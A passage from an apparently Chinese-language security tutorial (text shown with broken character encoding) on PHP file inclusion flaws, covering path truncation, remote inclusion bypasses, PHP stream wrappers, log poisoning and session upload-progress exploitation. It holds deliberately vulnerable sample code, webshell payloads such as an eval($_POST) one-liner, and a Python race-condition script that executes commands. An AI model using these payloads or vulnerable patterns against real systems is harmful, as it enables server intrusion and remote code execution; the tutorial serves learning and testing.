x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</span><br></pre></td></tr></table></figure>



<h5 id="ç‚¹å·æˆªæ–­"><a href="#ç‚¹å·æˆªæ–­" class="headerlink" title="ç‚¹å·æˆªæ–­"></a><strong>ç‚¹å·æˆªæ–­</strong></h5><p>æ¡ä»¶ï¼š</p>
<p>â€‹        windows OSï¼Œç‚¹å·éœ€è¦é•¿äº256</p>
<p>testä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>



<h4 id="sessionæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#sessionæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«æ¼æ´"></a>sessionæ–‡ä»¶åŒ…å«æ¼æ´</h4><p><a href="http://t0mrvvi1b3t.top/2021/04/29/%E5%85%B3%E4%BA%8Esession/">å…³äºsession</a></p>
<p>åˆ©ç”¨æ¡ä»¶ï¼šå½“sessionçš„å­˜å‚¨ä½ç½®å¯ä»¥è·å–</p>
<ol>
<li><p>é€šè¿‡phpinfoçš„ä¿¡æ¯å¯ä»¥è·å–åˆ°sessionçš„å­˜å‚¨ä½ç½® å¦‚ä¸‹ğŸ‘‡</p>
<p>â€‹    é€šè¿‡phpinfoçš„ä¿¡æ¯ï¼Œè·å–åˆ°session.save_pathä¸º/var/lib/php/sessionï¼š</p>
</li>
</ol>
<p><img src="https://img.vim-cn.com/e8/4552334a0f0ec9ca88052c5a60d233e6098e97.png" alt="p2"></p>
<ol start="2">
<li><p>é€šè¿‡çŒœæµ‹é»˜è®¤çš„sessionå­˜æ”¾ä½ç½®è¿›è¡Œå°è¯•  å¦‚ä¸‹ğŸ‘‡</p>
<p>â€‹    å¦‚linuxä¸‹é»˜è®¤å­˜å‚¨åœ¨/var/lib/php/sessionç›®å½•ä¸‹</p>
</li>
</ol>
<p>sessionä¸­çš„å†…å®¹å¯ä»¥è¢«æ§åˆ¶ï¼Œä¼ å…¥æ¶æ„ä»£ç </p>
<p>testä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç ä¼šå°†è·å–åˆ°çš„GETæ–¹å¼ä¼ å…¥å‚æ•°å­˜å…¥åˆ°sessionä¸­</p>
<p><strong>æ¼æ´åˆ©ç”¨</strong></p>
<p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥çŸ¥é“ä¼ å…¥å‚æ•°ä¼šå­˜å‚¨åœ¨sessionæ–‡ä»¶ä¸­ï¼Œè‹¥å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±å¯ä»¥aå˜é‡å†™å…¥åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>
<h4 id="è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</h4><p>æ¡ä»¶ï¼š</p>
<ol>
<li>allow_url_fopen = Onï¼ˆæ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼‰</li>
<li>allow_url_include = Onï¼ˆæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ï¼‰</li>
</ol>
<p>æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>testä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;phpinfo.txt</span><br><span class="line"></span><br><span class="line">phpinfo.txt:</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>testä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡æ–¹å¼ï¼š</p>
<ol>
<li>é—®å·ç»•è¿‡  payloadï¼šfilename=<a href="http://xxx.xxx.xxx.xxx/phpinfo.txt">http://xxx.xxx.xxx.xxx/phpinfo.txt</a>?</li>
<li>#å·ç»•è¿‡  payloadï¼šfilename=<a href="http://xxx.xxx.xxx.xxx/phpinfo.txt%23">http://xxx.xxx.xxx.xxx/phpinfo.txt%23</a></li>
<li>ç©ºæ ¼ç»•è¿‡ payloadï¼šfilename=<a href="http://xxx.xxx.xxx.xxx/phpinfo.txt%20">http://xxx.xxx.xxx.xxx/phpinfo.txt%20</a>  </li>
</ol>
<h4 id="å…³äºphpä¼ªåè®®"><a href="#å…³äºphpä¼ªåè®®" class="headerlink" title="å…³äºphpä¼ªåè®®"></a>å…³äº<a href="https://segmentfault.com/a/1190000018991087">phpä¼ªåè®®</a></h4><p><img src="https://ae01.alicdn.com/kf/Hab0f83469c9546fe89dc86301793dc07T.png" alt="image.png"></p>
<h5 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h5><p>é€šè¿‡fileåè®®å¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè¯»å–åˆ°æ–‡ä»¶çš„å†…å®¹</p>
<p>test:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;file:&#x2F;&#x2F;c:&#x2F;xxx.txt</span><br></pre></td></tr></table></figure>



<h5 id="http"><a href="#http" class="headerlink" title="http://"></a>http://</h5><p>æ¡ä»¶</p>
<ol>
<li>å—allow_url_fopené™åˆ¶</li>
</ol>
<p>æ ¼å¼ï¼šfile=<a href="http://xxx.xxx.xxx.xxx/xxx.xxx">http://xxx.xxx.xxx.xxx/xxx.xxx</a></p>
<h5 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h5><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚ç›¸å…³é™åˆ¶æ¡ä»¶æŸ¥çœ‹<a href="https://www.php.net/manual/zh/wrappers.php.php">å®˜æ–¹æ–‡æ¡£</a></p>
<h6 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h6><p><strong>è¯»å–POSTæ•°æ®</strong></p>
<p>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚å³å¯ä»¥ç›´æ¥è¯»å–åˆ°POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚ enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚</p>
<p>ç”¨æ³•ï¼š?file=php://input æ•°æ®åˆ©ç”¨POSTä¼ è¿‡å»ã€‚</p>
<p>testï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//post.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è®¿é—®post.php  ç„¶åç›´æ¥postä¸Šä¼ æ•°æ®å³å¯</p>
<p><strong>å†™å…¥æœ¨é©¬</strong></p>
<p>æ¡ä»¶ï¼š</p>
<ol>
<li>éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_include</li>
<li>PHP &lt; 5.3.0</li>
</ol>
<p>testï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//POSTä¼ å…¥</span></span><br><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å‘½ä»¤æ‰§è¡Œ</strong></p>
<p>æ¡ä»¶ï¼š</p>
<ol>
<li>éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_include</li>
<li>PHP &lt; 5.3.0</li>
</ol>
<p>å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œå³POSTè¿‡å»PHPä»£ç ï¼Œå³å¯æ‰§è¡Œã€‚</p>
<p>teståŒä¸Š</p>
<p>ç›´æ¥postä¼ phpä»£ç å°±å¯æ‰§è¡Œ</p>
<h6 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h6><p>å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚</p>
<p>æ¡ä»¶</p>
<ol>
<li>åªæ˜¯è¯»å–ï¼Œéœ€è¦å¼€å¯ allow_url_fopenï¼Œä¸éœ€è¦å¼€å¯ allow_url_include</li>
</ol>
<p>ç”¨æ³•ï¼š?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
<p>æˆ–æ˜¯  ?filename=php://filter/read=convert.base64-encode/resource=xxx.php</p>
<p>å‚æ•°ï¼šğŸ‘‡</p>
<p><img src="https://ae03.alicdn.com/kf/H852d11d3b87f4974a38554413358a4eah.png" alt="image.png"></p>
<h5 id="data-ï¼ˆå¯ä»¥æ‰§è¡Œphpä»£ç ï¼‰"><a href="#data-ï¼ˆå¯ä»¥æ‰§è¡Œphpä»£ç ï¼‰" class="headerlink" title="data://ï¼ˆå¯ä»¥æ‰§è¡Œphpä»£ç ï¼‰"></a>data://ï¼ˆå¯ä»¥æ‰§è¡Œphpä»£ç ï¼‰</h5><p>æ•°æ®æµå°è£…å™¨ï¼Œå’Œphp://ç›¸ä¼¼éƒ½æ˜¯åˆ©ç”¨äº†æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œæ–‡ä»¶çš„åŒ…å«æ–¹æ³•åŒ…å«äº†ä½ çš„è¾“å…¥æµï¼Œé€šè¿‡ä½ è¾“å…¥payloadæ¥å®ç°ç›®çš„</p>
<p>ä¾‹å¦‚ï¼šdata://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
<p>æ¡ä»¶ï¼š</p>
<ol>
<li>PHPç‰ˆæœ¬5.2ï¼Œ5.3ï¼Œ5.5ï¼Œ7.0ï¼›data:// åè®®æ˜¯æ˜¯å—é™äºallow_url_fopençš„ï¼Œå®˜æ–¹æ–‡æ¡£ä¸Šç»™å‡ºçš„æ˜¯NOï¼Œæ‰€ä»¥è¦ä½¿ç”¨data://åè®®è¦æ»¡è¶³åŒonæ¡ä»¶</li>
</ol>
<p><strong>1ã€è¯»å–æ–‡ä»¶</strong></p>
<p>å’Œphpä¼ªåè®®çš„inputç±»ä¼¼ï¼Œç¢°åˆ°file_get_contents()æ¥ç”¨</p>
<p>å¦‚æœphp.inié‡Œçš„allow_url_include=Onï¼ˆPHP &lt; 5.3.0ï¼‰,å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™å°±å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>testï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;								&#x2F;&#x2F;&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>



<h5 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h5><ol>
<li>zip://, bzip2://, zlib://åè®®åœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨</li>
<li>zlib:// ï¼Œbzip2:// ï¼Œzip:// â€” å‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œè€Œä¸”ä¸éœ€è¦æŒ‡å®šåç¼€åã€‚é…åˆæ–‡ä»¶ä¸Šä¼ æ¥getshell</li>
</ol>
<h6 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h6><p>æ¡ä»¶ï¼š PHP &gt; =5.3.0ï¼Œæ³¨æ„åœ¨windowsä¸‹æµ‹è¯•è¦5.3.0&lt;PHP&lt;5.4 æ‰å¯ä»¥</p>
<p>ä½¿ç”¨ï¼šzip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</p>
<p>æ³¨æ„æ”¹åç¼€ä»¥åŠå°†#ç¼–ç ä¸º%23</p>
<h6 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2://"></a>bzip2://</h6><p>compress.bzip2://file.bz2</p>
<p>åœ¨compress.bzip2://ç›´æ¥åŠ å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼Œç›¸å¯¹ç»å¯¹éƒ½å¯ä»¥</p>
<h6 id="zlib-1"><a href="#zlib-1" class="headerlink" title="zlib://"></a>zlib://</h6><p>ä½¿ç”¨ï¼šcompress.zlib://file.gz</p>
<p>åœ¨compress.zlib://ç›´æ¥åŠ å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼Œç›¸å¯¹ç»å¯¹éƒ½å¯ä»¥</p>
<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>è¿™ä¸ªå‚æ•°æ˜¯å°±æ˜¯phpè§£å‹ç¼©åŒ…çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå½“åšå‹ç¼©åŒ…æ¥è§£å‹ã€‚</p>
<p>ç”¨æ³•ï¼š?file=phar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶ ã€‚</p>
<p>æ³¨æ„ï¼š PHP &gt; =5.3.0 å‹ç¼©åŒ…éœ€è¦æ˜¯zipåè®®å‹ç¼©ï¼Œrarä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ æ­¥éª¤ï¼š å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶shell.phpï¼Œç„¶åç”¨zipåè®®å‹ç¼©ä¸ºshell.zipï¼Œç„¶åå°†åç¼€æ”¹ä¸ºpngç­‰å…¶ä»–æ ¼å¼ã€‚</p>
<p>testï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<h4 id="åŒ…å«æ—¥å¿—æ–‡ä»¶getshell"><a href="#åŒ…å«æ—¥å¿—æ–‡ä»¶getshell" class="headerlink" title="åŒ…å«æ—¥å¿—æ–‡ä»¶getshell"></a>åŒ…å«æ—¥å¿—æ–‡ä»¶getshell</h4><p>å½“æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰url_allow_includeåŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘<strong>åŒ…å«æœåŠ¡å™¨çš„æ—¥å¿—æ–‡ä»¶ã€‚</strong></p>
<p>åŸç†ï¼šå½“æˆ‘ä»¬è®¿é—®ç½‘ç«™æ—¶ï¼ŒæœåŠ¡å™¨çš„æ—¥å¿—ä¸­éƒ½ä¼šè®°å½•æˆ‘ä»¬çš„è¡Œä¸ºï¼Œå½“æˆ‘ä»¬è®¿é—®é“¾æ¥ä¸­åŒ…å«PHPä¸€å¥è¯æœ¨é©¬æ—¶ï¼Œä¹Ÿä¼šè¢«è®°å½•åˆ°æ—¥å¿—ä¸­</p>
<p>æ­¥éª¤ï¼š</p>
<ol>
<li>æ‰¾åˆ°æ—¥å¿—å­˜æ”¾ä½ç½®</li>
<li>ç”¨bpæˆ–è€…curlæ¥é¿å…urlè½¬ç </li>
</ol>
<p>ç›¸å…³ç»†èŠ‚è§<a href="https://www.cnblogs.com/my1e3/p/5854897.html">è¿™é‡Œ</a></p>
<p>ä¹Ÿå¯ä¿®æ”¹UAæ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<h4 id="åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«"><a href="#åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«" class="headerlink" title="åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«"></a>åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«</h4><p>è¿™ä¸ªåŠŸèƒ½åœ¨php5.4æ·»åŠ çš„éœ€è¦æ³¨æ„ä¸€ä¸‹ç‰ˆæœ¬.</p>
<p>åœ¨php.iniæœ‰ä»¥ä¸‹å‡ ä¸ªé»˜è®¤é€‰é¡¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œï¼Œæˆ‘ä»¬åªéœ€è¦äº†è§£å‰å››ä¸ªé…ç½®é€‰é¡¹å³å¯</p>
<blockquote>
<p><code>enabled=on</code>è¡¨ç¤º<code>upload_progress</code>åŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›</p>
<p><code>cleanup=on</code>è¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ï¼›</p>
<p><code>name</code>å½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼›</p>
<p><code>prefix+name</code>å°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å</p>
</blockquote>
<p>testç¯å¢ƒï¼š</p>
<ul>
<li>php5.5.38</li>
<li>Windows10</li>
<li>å…³äºsessionçš„é…ç½®ä¸ºé»˜è®¤å€¼</li>
</ul>
<p>ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°ä¸€ä¸ªå¯ä»¥åŒ…å«çš„æ¶æ„æ–‡ä»¶ã€‚å…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>session.upload_progress</code>å°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ï¼Œä»è€ŒåŒ…å«sessionæ–‡ä»¶ã€‚å‰æéœ€è¦çŸ¥é“sessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ä»£ç é‡Œè¾¹å¹¶æ²¡æœ‰session_start() é‚£ä¹ˆæ€ä¹ˆåˆ›å»ºsessionæ–‡ä»¶å‘¢ï¼Ÿå¦‚æœ<code>session.auto_start=On</code> ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ä½†sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=T0mrï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š/tmp/sess_T0mrã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚</p>
<p>ç¬¬äºŒä¸ªé—®é¢˜  é»˜è®¤é…ç½®<code>session.upload_progress.cleanup = on</code>å¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œé‚£æ€ä¹ˆæ‰å¯ä»¥è¿›è¡Œrceå‘¢</p>
<p>å¯ä»¥åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;T0mr&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;url&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;url?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxx.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span 